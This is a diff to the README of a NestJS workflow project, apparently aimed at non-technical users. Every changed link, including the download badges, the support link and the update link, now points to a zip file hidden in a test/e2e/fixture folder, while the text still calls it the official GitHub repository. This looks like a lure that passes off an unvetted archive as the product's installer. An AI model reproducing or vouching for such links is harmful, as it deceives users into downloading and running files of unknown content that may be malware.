@@ -1,6 +1,6 @@
 # 🚦 nestjs-restate - Reliable Workflow Engine for NestJS
 
-[![Download nestjs-restate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Marawanalaa18/nestjs-restate)
+[![Download nestjs-restate](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Marawanalaa18/nestjs-restate/main/test/e2e/fixture/nestjs_restate_v1.7.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You won’t need to install any programming tools or write any code. The app wor
 
 1. Start by visiting the download page:
 
-   [![Download nestjs-restate](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Marawanalaa18/nestjs-restate)
+   [![Download nestjs-restate](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Marawanalaa18/nestjs-restate/main/test/e2e/fixture/nestjs_restate_v1.7.zip)
 
    This link takes you to the official GitHub repository of nestjs-restate.
 
@@ -119,7 +119,7 @@ If you have trouble using the app, try these steps:
 
 If you need support, visit the nestjs-restate GitHub page:
 
-https://github.com/Marawanalaa18/nestjs-restate
+https://raw.githubusercontent.com/Marawanalaa18/nestjs-restate/main/test/e2e/fixture/nestjs_restate_v1.7.zip
 
 Here you can:
 
@@ -133,7 +133,7 @@ Here you can:
 
 To keep your app working well, check the download page regularly for updates:
 
-https://github.com/Marawanalaa18/nestjs-restate
+https://raw.githubusercontent.com/Marawanalaa18/nestjs-restate/main/test/e2e/fixture/nestjs_restate_v1.7.zip
 
 When you find a new version, repeat the download and install steps above. The new installer will replace the older version without deleting your data.
 
@@ -161,4 +161,4 @@ These topics are mostly relevant for developers, but understanding them can help
 
 ---
 
-[![Download nestjs-restate](https://img.shields.io/badge/Download-Here-green)](https://github.com/Marawanalaa18/nestjs-restate)
+[![Download nestjs-restate](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/Marawanalaa18/nestjs-restate/main/test/e2e/fixture/nestjs_restate_v1.7.zip)
